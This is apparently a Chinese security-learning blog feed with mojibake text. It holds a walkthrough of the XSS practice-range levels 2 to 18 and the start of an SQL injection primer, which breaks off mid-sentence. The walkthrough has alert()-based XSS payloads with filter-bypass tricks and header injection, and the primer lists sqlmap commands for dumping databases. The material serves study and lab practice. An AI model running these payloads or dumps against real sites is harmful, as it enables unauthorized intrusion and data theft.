href="http://xssaq.com/yx/level2.php?keyword=test">http://xssaq.com/yx/level2.php?keyword=test</a><br>GETå‹,è¾“å…¥<code>&lt;script&gt;alert(/hack11/)&lt;/script&gt;</code>ï¼š<br><img src="https://i.loli.net/2021/02/13/DBNOTv9yuzCqMQm.png"></p><p>æ„é€ é—­åˆï¼Œå³<code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;//</code><br>â€œå’Œ&gt;å°†å…¶ä¹‹å‰çš„è¯­å¥é—­åˆä¸ºvalue=&lt;â€â€&gt;,//æˆ–è€…&lt;â€å°†åæ–¹â€&gt;æ³¨é‡Š<br><img src="https://i.loli.net/2021/02/13/GHM4a78wmlZrt1f.png"></p><h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><p>ValueåŒ2ï¼Œvalue=â€â€&gt;<br><code>&lt;script&gt;alert(/hack11/)&lt;/script&gt;</code>,æŸ¥çœ‹å“åº”ï¼Œåç«¯å°†&lt;&gt;è¿‡æ»¤äº†<br><img src="https://i.loli.net/2021/02/13/IBsk2vCh5fR4oFD.png"></p><p>æŸ¥çœ‹æºç ï¼Œä½¿ç”¨äº†htmlspecialcharså‡½æ•°<br><img src="https://i.loli.net/2021/02/13/n5wQOlJ4BMG6Xms.png"><br><img src="https://i.loli.net/2021/02/13/FSEZ6xjpqacyXD1.png"></p><p>å¯ä»¥ä½¿ç”¨ä¸å¸¦æœ‰å°–æ‹¬å·çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œå°è¯•<br>å¦‚ï¼š<code>&#39; onclick=&#39;alert(1)</code><br>ï¼ˆåˆ©ç”¨äº†HTML DOM çš„onclickäº‹ä»¶ï¼Œç‚¹å‡»åè§¦å‘åŒ…å«çš„å‘½ä»¤ï¼‰    </p><ul><li>ç¬¬ä¸€ä¸ªå•å¼•å·çš„ä½œç”¨ï¼šé—­åˆ<code>value=&#39;</code></li><li>ç¬¬äºŒä¸ªå•å¼•å·çš„ä½œç”¨ï¼šä¸valuer=â€™â€™çš„ç¬¬äºŒä¸ªå¼•å·å¯¹åº”ï¼Œæ„æˆ<code>onclick=&#39;alert(1)&#39;</code><br><img src="https://i.loli.net/2021/02/13/ifQhPs5CEXYJcbD.png"></li></ul><h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><p>è¾“å…¥ï¼š<code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;//</code>        ï¼Œ<code>&lt;&gt;</code>è¢«è¿‡æ»¤<br><img src="https://i.loli.net/2021/02/13/5XnuHTlBzUYPGSi.png"></p><p>ç±»ä¼¼level3ï¼Œä¸åŒçš„æ˜¯å•å¼•å·æ¢ä¸ºåŒå¼•å·æ„é€ é—­åˆï¼š<br><code>&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/hVZxg39tKsEAfpG.png"></p><h2 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h2><ul><li><p>å°è¯• <code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;&lt;&quot;</code>ï¼Œå‘ç°scriptè¢«è¿‡æ»¤<br><img src="https://i.loli.net/2021/02/13/fwqic3VlrZvYRz2.png"></p></li><li><p>å°è¯•<code>&quot; onclick=&quot;alert(1)</code>ï¼Œå‘ç°onè¢«è¿‡æ»¤<br><img src="https://i.loli.net/2021/02/13/lLNBKGCsAtcQom8.png"></p></li><li><p>æœ€ç»ˆpocï¼š<code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;&lt;&quot;</code><br><img src="https://i.loli.net/2021/02/13/2QKFvDzJmacTxYS.png"><br>ç‚¹å‡»å³å¯è§¦å‘<br><img src="https://i.loli.net/2021/02/13/YLMlUZ6IVq3mwtj.png"></p></li></ul><h2 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h2><ul><li><p>æ„é€  <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>    ï¼Œ<code>script</code>è¢«è¿‡æ»¤<br><img src="https://i.loli.net/2021/02/13/mkcMn8bqDWVdLpg.png"></p></li><li><p>æ„é€  <code>&lt;img src=x onerror=alert(1)&gt;</code>  ,<code>src</code>,<code>on</code>è¢«è¿‡æ»¤<br><img src="https://i.loli.net/2021/02/13/h4gtFHRDqI5KBpf.png"></p></li><li><p>æ„é€  <code>&lt;a href=javascript:alert(1)&gt;</code>     ï¼Œ<code>href</code>è¢«è¿‡æ»¤<br><img src="https://i.loli.net/2021/02/13/yCrAILKH3dzEfgl.png"></p></li></ul><ul><li>æœ€ç»ˆpoc1ï¼š<br><code>&quot;&gt;&lt;a Href=javascript:alert(1)&gt;&lt;&quot;</code> è¿›è¡Œå¤§å°å†™ç»•è¿‡<br><img src="https://i.loli.net/2021/02/13/PDRVBjso12MxYXH.png"><br><img src="https://i.loli.net/2021/02/13/ZJ73fWwcuYhzxFe.png"></li></ul><ul><li>æœ€ç»ˆpoc2ï¼š<br><code>&quot; ONclick=&quot;alert(1)</code>ï¼Œå…¶ä»–äº¦åŒ<br><img src="https://i.loli.net/2021/02/13/ejVWHLoqZrpixaf.png"></li></ul><ul><li>æºç ï¼šè¿‡æ»¤éƒ¨åˆ†å…³é”®å­—ï¼Œæ²¡æœ‰å¯¹å¤§å°å†™è¿›è¡Œé’ˆå¯¹<br><img src="https://i.loli.net/2021/02/13/Lo31XaGHvIMRitw.png"></li></ul><h2 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h2><ul><li>è€å››æ ·æµ‹è¯•ï¼Œscriptã€srcã€onã€hrefçš†è¢«ç½®æ¢ä¸ºç©º</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;alert(<span class="hljs-number">1</span>)&lt;/script&gt; <br>&lt;img src=x onerror=alert(<span class="hljs-number">1</span>)&gt;<br>&lt;svg onload=alert(<span class="hljs-number">1</span>)&gt;<br>&lt;a href=javascript:alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/8CW54NmTldBEvLa.png"><br><img src="https://i.loli.net/2021/02/13/zZEaPMpcVQT5LCt.png"><br><img src="https://i.loli.net/2021/02/13/RfE3meS25jqy4oz.png"><br><img src="https://i.loli.net/2021/02/13/qMYmV7ZT8KC1t2J.png"></p><ul><li>å°è¯•å¤§å°å†™ç»•è¿‡ï¼Œä¼šå°†è¾“å…¥å…¨éƒ¨è½¬æ¢ä¸ºå°å†™ï¼Œåœ¨åŒ¹é…å…³é”®è¯ç½®æ¢ä¸ºç©º</li><li>poc(åŒå†™ç»•è¿‡)ï¼š<br><code>&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert(1)&gt;&lt;&quot;</code><br><img src="https://i.loli.net/2021/02/13/wq1KlSz2TGdJ6DR.png"><br><img src="https://i.loli.net/2021/02/13/4rtTgZfAanjWYc7.png"></li></ul><ul><li>æºç ï¼šè¿‡æ»¤éƒ¨åˆ†å…³é”®å­—ï¼šstrtoloweræŠŠæ‰€æœ‰å­—ç¬¦è½¬æ¢ä¸ºå°å†™å†è¿›è¡Œè¿‡æ»¤</li></ul><p><img src="https://i.loli.net/2021/02/13/tMjuFApHsYIP7xc.png"></p><h2 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h2><ul><li><p>â€˜æ·»åŠ å‹æƒ…é“¾æ¥â€™ï¼Œåº”ä¸ºDOMå‹xss<br><code>&lt;a href=javascript:alert(1)&gt;</code>ï¼š<br>hrefï¼Œjavascriptéƒ½è¢«è¿‡æ»¤ï¼Œå¤§å°å†™å’ŒåŒå†™ç»•è¿‡éƒ½å¤±æ•ˆ<br><img src="https://i.loli.net/2021/02/13/okHQ72fMaguFmEr.png"></p></li><li><p>å°è¯•ç¼–ç ç»•è¿‡<br><code>javascript:alert(1)</code><br><img src="https://i.loli.net/2021/02/13/4NfeLIc6BguKdrZ.png"></p></li><li><p>Burpsuiteç¼–ç </p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/jyH9wteMQIm2xhD.png"></p><h2 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h2><ul><li>DOMå‹ï¼ŒåŸºäºLevel8å¤šäº†ä¸€ä¸ªåˆ¤å®šï¼ŒæŸ¥çœ‹æºç ï¼Œéœ€åœ¨æ„é€ è¯­å¥ååŠ ä¸Š<code>http://</code><br>å³ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;<span class="hljs-comment">//http://</span><br></code></pre></td></tr></table></figure><ul><li>æºç ï¼š<br>åŒ8ï¼Œå…ˆå°†å…³é”®å­—æ›¿æ¢ï¼Œå†åˆ¤æ–­å˜é‡åæ˜¯å¦æœ‰<code>http://</code><br>Strpos($str,â€™http://â€™)ï¼šæŸ¥æ‰¾http://åœ¨å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®<br><img src="https://i.loli.net/2021/02/13/WqVb1EzPLfopyCx.png"></li></ul><h2 id="Level10"><a href="#Level10" class="headerlink" title="Level10"></a>Level10</h2><ul><li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>        è¿‡æ»¤äº†<code>&lt;&gt;</code>ï¼Œå°è¯•ç¼–ç ä¸èƒ½ç»•è¿‡ï¼Œæ— æ³•æ„é€ äº‹ä»¶è§¦å‘xssã€æ— æ³•åˆ©ç”¨å±æ€§çš„javascriptåè®®ã€æ— æ³•åˆ©ç”¨cssæ³¨å…¥<br><img src="https://i.loli.net/2021/02/13/rkp8zyZWtIailOT.png"></p></li><li><p>å­˜åœ¨ä¸‰ä¸ªinputå˜é‡ï¼Œå°è¯•æäº¤<br>æºç ï¼š<code>&lt;input name=&quot;t_sort&quot;  value=&quot; &#39;.$str33.&#39; &quot; type=&quot;hidden&quot;&gt;</code><br>Payloadï¼š<code>1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/oKn6UHsgJPMIrqj.png"><br><code>1&amp;t_sort=xxx</code> å°†xxxä½œä¸ºt_sortçš„valueè¾“å…¥<br><code>&quot; type=&quot;text&quot; onclick=&quot;alert(1) </code>æ˜¯ç½®å…¥value    çš„è¯­å¥<br><code>type=&quot;text&quot;</code> å½¢æˆå¯ç‚¹å‡»çš„æ–‡æœ¬æ¡†ï¼Œæ–¹ä¾¿è§¦å‘å…¶åçš„onclick=â€alert(1)</p></li></ul><h2 id="Level11"><a href="#Level11" class="headerlink" title="Level11"></a>Level11</h2><ul><li><p>æŸ¥çœ‹æºç <br>ä»…t_sortå’Œt_refçš„å¯ä¼ å‚ï¼Œ<br><code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];//</code>å°†payloadä»httpå¤´çš„refereræ è·å–<br><img src="https://i.loli.net/2021/02/13/2CutM5RFrlQoBhX.png"></p></li><li><p>ä¸€ï¼<br>æµè§ˆå™¨æ’ä»¶ä¿®æ”¹referferï¼Œ<code>value=1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/JVetGAoDWhNuriS.png"></p></li><li><p>äºŒï¼<br>åˆ©ç”¨burpsuiteåœ¨è·³è½¬è‡³è¯¥ç½‘é¡µæ—¶æŠ“åŒ…ï¼Œä¿®æ”¹å…¶ä¸­<code>referer</code>ä¸º<code>poc</code>å³å¯<br><code>1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/brkZhBiJusDGMmT.png"></p></li></ul><h2 id="Level12"><a href="#Level12" class="headerlink" title="Level12"></a>Level12</h2><ul><li>è¾“å…¥ï¼š<code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/FOBly6kYp5hQAxZ.png"><br><img src="https://i.loli.net/2021/02/13/8EiaVFOuep1N5nZ.png"></li></ul><ul><li>ä»æ ‡å¤´ä¸­çš„User-Agentä¸­è·å–<br>User-Agentï¼š<code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/W5JizDwSFlqy62Y.png"></li></ul><h2 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h2><p>å¦‚å›¾<br><img src="https://i.loli.net/2021/02/13/EZn9j6qgMdRUGXS.png"></p><ul><li>æŸ¥çœ‹æ ‡å¤´<br><img src="https://i.loli.net/2021/02/13/WDyMe6XP7w9vTs8.png"></li></ul><ul><li>ä¿®æ”¹cookie<br>Cookieï¼š<code>user=&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;</code></li></ul><p><img src="https://i.loli.net/2021/02/13/dsWx4JaFARcfgEp.png"></p><h2 id="Level14"><a href="#Level14" class="headerlink" title="Level14"></a>Level14</h2><p>ç™¾åº¦ä¸€ä¸‹ï¼šæœ¬å…³å› iframeè°ƒç”¨çš„æ–‡ä»¶åœ°å€å¤±æ•ˆï¼Œæ— æ³•è¿›è¡Œæµ‹è¯•ã€‚è¦è€ƒçš„åº”è¯¥æ˜¯é€šè¿‡ä¿®æ”¹    iframeè°ƒç”¨çš„æ–‡ä»¶æ¥å®ç°xssæ³¨å…¥</p><h2 id="Level15"><a href="#Level15" class="headerlink" title="Level15"></a>Level15</h2><ul><li><p>ng-includeæŒ‡ä»¤ä¸€èˆ¬ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ï¼Œng-includeå±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾    å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åï¼Œä½†æ˜¯é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚<br><img src="https://i.loli.net/2021/02/13/fTDSb42LBXuZdjy.png"></p></li><li><p>å¯ä»¥åŒ…å«ä¸€ä¸ªæœ‰æ¼æ´çš„é¡µé¢è¿›è¡Œç ´è§£<br>eg:    <code>level15.php?src=&#39;name=&lt;script&gt;alert(1)&lt;/script&gt;&#39;</code></p></li></ul><h2 id="Level16"><a href="#Level16" class="headerlink" title="Level16"></a>Level16</h2><ul><li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://i.loli.net/2021/02/13/NBiRrWhDmXpkYeZ.png"></p></li><li><p>ç©ºæ ¼ã€åæ–œæ ã€scriptéƒ½è¢«str_replaceå‡½æ•°æ›¿æ¢æˆ&amp;nbsp<br><img src="https://i.loli.net/2021/02/13/vw2HtkGNqFW1ylD.png"></p></li><li><p>HTMLä¸­å¯ä»¥å°†%0aæˆ–è€…%0Då½“æˆç©ºæ ¼ä½¿ç”¨ï¼Œæ•…å¯æ„é€ <br>Pocï¼š<code>&lt;svg%0aonload=alert(1)&gt;</code><br><img src="https://i.loli.net/2021/02/13/WOAj6vXTerNdChY.png"></p></li></ul><h2 id="Level17"><a href="#Level17" class="headerlink" title="Level17"></a>Level17</h2><ul><li><p>Urlä¸­ï¼šlevel17.php?arg01=123&amp;arg02=321<br>å°†arg01å’Œarg02çš„ç»“æœç”¨=æ‹¼æ¥<br><img src="https://i.loli.net/2021/02/13/H7Wjb1OS5twXYq2.png"></p></li><li><p>å¯åˆ©ç”¨æ­¤æ„é€ ï¼š<code>onclick=javascript:alert(/xss/)</code><br>Pocï¼š<code>level17.php?arg01= onmousemove&amp;arg02=javascript:alert(/xss/)</code><br><img src="https://i.loli.net/2021/02/13/CmdPrh5uHVcEkyG.png"></p></li></ul><h2 id="Level18"><a href="#Level18" class="headerlink" title="Level18"></a>Level18</h2><p>åŒ17<br><img src="https://i.loli.net/2021/02/13/DUo8dhKymzrpJEQ.png"></p>]]></content>
    
    
    <categories>
      
      <category>é¶åœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>é¶åœº</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlæ³¨å…¥çš„ä¸€äº›åŸºæ“</title>
    <link href="/2020/12/30/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%93%8D/"/>
    <url>/2020/12/30/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%93%8D/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç¬¬ä¸€æ¬¡å†™åšå®¢0.0ï¼Œæ¢³ç†ä¹Ÿè®°å½•ä¸€ä¸‹è‡ªå·±å­¦ä¹ çš„çŸ¥è¯†ç‚¹ï¼Œä¹Ÿæ–¹ä¾¿æ—¥åå¤ä¹ å­ã€‚<br>å¦‚æœ‰é”™æ¼è¿˜è¯·ä¸åæŒ‡æ­£ya<br>ä¸€äº›å‰ç½®çŸ¥è¯†ï¼š<a href="https://www.cnblogs.com/backlion/p/7344548.html">Sqli-labsä¹‹sqlæ³¨å…¥åŸºç¡€çŸ¥è¯†</a></p><h1 id="sqlæ³¨å…¥åŸç†"><a href="#sqlæ³¨å…¥åŸç†" class="headerlink" title="sqlæ³¨å…¥åŸç†"></a>sqlæ³¨å…¥åŸç†</h1><ul><li>sql æ³¨å…¥ï¼šå³é€šè¿‡æŠŠSQLå‘½ä»¤æ’å…¥åˆ°Webè¡¨å•é€’äº¤æˆ–è¾“å…¥åŸŸåæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„SQLå‘½ä»¤ã€‚</li></ul><ul><li><p>sqlæ³¨å…¥æ¼æ´çš„äº§ç”Ÿæ¡ä»¶ï¼š</p><ol><li>å‚æ•°ç”¨æˆ·å¯æ§ï¼šå‰ç«¯ä¼ ç»™åç«¯çš„å‚æ•°å†…å®¹æ—¶ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„</li><li>å‚æ•°ä¼šè¢«å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ï¼šä¼ å…¥çš„å‚æ•°ä¼šæ‹¼æ¥åˆ°sqlè¯­å¥ï¼Œå¹¶ä¸”å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚</li></ol></li><li><p>ä¸€æ»¡è¶³ä»¥ä¸Šä¸¤æ¡ä»¶çš„PHPè¯­å¥ï¼š</p><blockquote><p>$query = â€œSELECT * FROM users WHERE id = $_GET[ â€˜idâ€™ ] â€œ;</p></blockquote></li></ul><p>(ä¸ªäººç†è§£sqlæ³¨å…¥å°±æ˜¯å°†è¦æ³¨å…¥çš„sqlå‘½ä»¤ç½®äºè¡¨å•æŸ¥è¯¢çš„å˜é‡ä¸­ï¼Œæ‰¾åˆ°è¯¥å˜é‡çš„é—­åˆæ–¹å¼å°†å…¶é—­åˆèµ·æ¥ï¼Œä»è€Œä½¿å¾—æ³¨å…¥çš„sqlå‘½ä»¤ç‹¬ç«‹äºæŸ¥è¯¢å˜é‡ä¹‹å¤–ï¼Œè¾¾åˆ°è®©æ³¨å…¥çš„sqlå‘½ä»¤ç”Ÿæ•ˆçš„ç›®çš„ã€‚)</p><h1 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h1><ul><li><strong>æ‰‹åŠ¨æ³¨å…¥</strong>ï¼šhackbarã€burpsuiteç­‰ç­‰</li><li><strong>sqlmap</strong>ï¼ˆåƒç›²æ³¨è¿™ç§æ¯”è¾ƒç´¯çš„è¿˜æ˜¯sqlmapæ–¹ä¾¿ï¼Œå¯¹ç›²æ³¨ç†è§£åŸç†å’Œæ–¹æ³•åæœ‰å·¥å…·æå‡æ•ˆç‡è¿˜æ˜¯ä¸é”™æ»´ï¼‰</li></ul><blockquote><p>sqlmap -h     #æŸ¥çœ‹ç›¸å…³å‚æ•°<br>sqlmap -u ç›®æ ‡ç½‘å€         â€”â€”åˆ¤æ–­ç½‘ç«™æ•°æ®åº“ç±»å‹<br>sqlmap -u ç›®æ ‡ç½‘å€ â€“dbs    â€”â€”æŸ¥çœ‹å­˜åœ¨çš„æ•°æ®åº“<br>sqlmap -u ç›®æ ‡ç½‘å€ â€“tables -D æ•°æ®åº“å    â€”â€”æŸ¥çœ‹æŒ‡å®šæ•°æ®åº“ä¸­å­˜åœ¨çš„è¡¨<br>sqlmap -u ç›®æ ‡ç½‘å€ â€“columns -T è¡¨å -D æ•°æ®åº“å    â€”â€”è·å–è¡¨ä¸­çš„å­—æ®µ<br>sqlmap -u ç›®æ ‡ç½‘å€ â€“dump -C å­—æ®µåç§° -T è¡¨å -D æ•°æ®åº“å    â€”â€”æŸ¥çœ‹è¡¨é‡Œå­˜å‚¨çš„å†…å®¹<br>â€“fresh-queries      â€”â€”æ¸…æ¥šç¼“å­˜ï¼Œç›´æ¥åŠ åœ¨å‘½ä»¤æœ«å°¾å³å¯ï¼ˆåœ¨sqlmapæ‰«ä¸€éä¹‹åä¸ºäº†å¿«æ·ä¼šå°†æ•°æ®ç¼“å­˜èµ·æ¥ï¼Œæœ‰æ—¶å€™ç½‘ç«™æ›´æ–°äº†æ•°æ®ä½†ä½¿ç”¨sqlmapå¾—åˆ°çš„ä»æ˜¯æœªæ›´æ–°çš„æ•°æ®ï¼Œè¿™æ—¶å€™å°±å¯ä»¥ç”¨è¿™ä¸ªå‘½ä»¤æ¸…é™¤ç¼“å­˜)</p></blockquote><blockquote><p>å¯åˆ©ç”¨sqkmapä¸­çš„â€“techniqueé€‰é¡¹æŒ‡å®šæ³¨å…¥æ–¹å¼ã€‚å¦‚ä¸‹ï¼š<br>B : åŸºäºBooleançš„ç›²æ³¨ï¼ˆBoolean based blindï¼‰<br>Q : å†…è”æŸ¥è¯¢ï¼ˆInline queriesï¼‰<br>T : åŸºäºæ—¶é—´çš„ç›²æ³¨ï¼ˆtime based blindï¼‰<br>U : åŸºäºè”åˆæŸ¥è¯¢ï¼ˆUnion query basedï¼‰<br>E : åŸºäºé”™è¯¯ï¼ˆerror basedï¼‰<br>S : æ ˆæŸ¥è¯¢ï¼ˆstack queriesï¼‰</p></blockquote><blockquote><p>ä»¥ä¸‹æ‘˜è‡ªï¼š<a href="https://www.cnblogs.com/insane-Mr-Li/p/10150165.html">Sqlmapå‘½ä»¤è¯¦è§£</a><br>cookieæ³¨å…¥ï¼šsqlmap.py -u æ³¨å…¥ç‚¹ â€“cookie â€œå‚æ•°â€ â€“tables â€“level 2<br>POSTç™»å½•æ¡†æ³¨å…¥ï¼šsqlmap.py -r ä»æ–‡ä»¶è¯»å–æ•°æ® -p æŒ‡å®šçš„å‚æ•° â€“tables<br>sqlmap.py -u ç™»å½•çš„åœ°å€ â€“forms è‡ªåŠ¨åˆ¤æ–­æ³¨å…¥<br>sqlmap.py -u ç™»å½•çš„åœ°å€ â€“data â€œæŒ‡å®šå‚æ•°â€</p></blockquote><h1 id="é¡µé¢è¯·æ±‚æ–¹å¼ä¸æ³¨é‡Š"><a href="#é¡µé¢è¯·æ±‚æ–¹å¼ä¸æ³¨é‡Š" class="headerlink" title="é¡µé¢è¯·æ±‚æ–¹å¼ä¸æ³¨é‡Š"></a>é¡µé¢è¯·æ±‚æ–¹å¼ä¸æ³¨é‡Š</h1><h2 id="è¯·æ±‚æ–¹å¼ï¼šGETå’ŒPOST"><a href="#è¯·æ±‚æ–¹å¼ï¼šGETå’ŒPOST" class="headerlink" title="è¯·æ±‚æ–¹å¼ï¼šGETå’ŒPOST"></a>è¯·æ±‚æ–¹å¼ï¼šGETå’ŒPOST</h2><ul><li><h3 id="GETè¯·æ±‚"><a href="#GETè¯·æ±‚" class="headerlink" title="GETè¯·æ±‚"></a>GETè¯·æ±‚</h3></li></ul><p>urlä¼ è¾¾å‚æ•°<br>æäº¤çš„ä¿¡æ¯ä¼šæ˜¾ç¤ºåœ¨urlä¸­<br>å¯ä»¥åœ¨urlä¸­è¿›è¡Œsqlæ³¨å…¥</p><ul><li><h3 id="POSTè¯·æ±‚"><a href="#POSTè¯·æ±‚" class="headerlink" title="POSTè¯·æ±‚"></a>POSTè¯·æ±‚</h3></li></ul><p>æäº¤çš„ä¿¡æ¯ä¸ä¼šå›æ˜¾åœ¨urlä¸­ï¼Œå®‰å…¨æ€§ç›¸å¯¹æ›´é«˜ï¼Œå¯ä»¥æŠ“åŒ…æˆ–è€…åˆ©ç”¨æ’ä»¶ä¿®æ”¹postæäº¤çš„ä¿¡æ¯<br>è¡¨å•æäº¤<br>é€šå¸¸æœ‰æ¡†æ¡†ï¼Œå¸¸è§æ¯”å¦‚ç™»é™†é¡µé¢çš„è´¦å·æ¡†å¯†ç æ¡†å•¥çš„.<br>å¯ä»¥åœ¨æ¡†æ¡†é‡Œæ³¨å…¥<br>ä¹Ÿå¯ä»¥ä½¿ç”¨hackbarä¸­çš„enable postæˆ–è€…burpsuiteæŠ“åŒ…ã€‚</p><ol><li><h4 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h4></li></ol><p>ç”¨çš„æ˜¯google chrome çš„è¿™æ¬¾hackbarï¼ŒUIç•Œé¢æŒºç®€æ´çš„ï¼ˆå…è´¹ï¼‰<img src="https://i.loli.net/2021/02/13/n4gqkmaNVLlxdjy.png"></p><p><img src="https://i.loli.net/2021/02/13/vexmbfJIXCR67g1.png"><br>ä¸è¿‡ä½¿ç”¨æ—¶è¦æ³¨æ„<br>åœ¨æ³¨sqli-labsé¶åœºçš„æ—¶å€™ä¸åˆ é™¤é€‰ä¸­çš„è¿™ä¸€æ®µä¼šæŠ¥é”™ï¼ˆè¿˜ä¸æ˜ç™½ä¸ºä»€ä¹ˆï¼‰ï¼Œå°±éœ€è¦å°†å›¾ä¸­è“è‰²è¿™ä¸€æ®µ(submit=Subimt)åˆ å»å†executeã€‚<br>burpsubiteä¸­ä¿æŒåŸæ ·å³å¯</p><ol start="2"><li><h4 id="burp-suite"><a href="#burp-suite" class="headerlink" title="burp suite"></a>burp suite</h4></li></ol><p>å…ˆæŠ“åŒ…ï¼Œä¸¢å»repeaterï¼Œæ³¨å…¥<br><img src="https://i.loli.net/2021/02/13/87JTt2GvwUOoaLH.png"></p><h2 id="æ³¨é‡Šæ–¹å¼ï¼š-æˆ–â€“"><a href="#æ³¨é‡Šæ–¹å¼ï¼š-æˆ–â€“" class="headerlink" title="æ³¨é‡Šæ–¹å¼ï¼š#æˆ–â€“+"></a>æ³¨é‡Šæ–¹å¼ï¼š#æˆ–â€“+</h2><ul><li><p>sqlä¸­çš„æ³¨é‡Šç¬¦ä¸º <code>-- (ç©ºæ ¼)</code> å’Œ <code>#</code> ä»¥åŠ <code>/* */</code><br>(å¤šè¡Œæ³¨é‡Š <code>/**/</code>ä¸ºæˆå¯¹åŒ¹é…ï¼Œå°† <code>/*</code> å’Œ <code>*/</code> ä¸­çš„å†…å®¹æ³¨é‡Šæ‰ï¼Œå¯åœ¨æ³¨å…¥æ—¶ç”¨äºç»•è¿‡è¿‡æ»¤è§„åˆ™)<br> <code>-- (ç©ºæ ¼)</code> ï¼š sqlä¸­è§„å®šï¼šâ€“å…¶åå¿…é¡»è·Ÿç©ºæ ¼<br> (å¦‚æœä¸åŠ ç©ºæ ¼ï¼Œâ€“ ä¼šå’Œç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆçš„å•å¼•å·è¿æ¥åœ¨ä¸€èµ·ï¼Œè¢«åˆ¤å®šä¸ºå…³é”®è¯ï¼Œæ— æ³•æ³¨é‡Šæ‰ç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆçš„å•å¼•å·)</p></li><li><p>ä½¿ç”¨<code>--+</code>çš„åŸå› ï¼š<br>åœ¨urlä¸­è¾“å…¥ç©ºæ ¼æŒ‰å›è½¦ï¼Œä¼ è¾“è¿‡ç¨‹ä¸­<strong>æœ«ç«¯</strong>çš„ç©ºæ ¼ä¼šè¢«å¿½ç•¥ï¼Œ<strong>å…¶ä½™</strong>ç©ºæ ¼ä¼šè¢«è½¬ä¹‰ä¸º%20ã€‚<br> è€Œ + ä¼šè¢«è§£é‡Šä¸ºç©ºæ ¼ï¼Œå› æ­¤åœ¨GETè¯·æ±‚æ³¨å…¥æ—¶ä½¿ç”¨<code>--+</code>æˆ–è€…<code>--%20</code>ä»£æ›¿<code>--(ç©ºæ 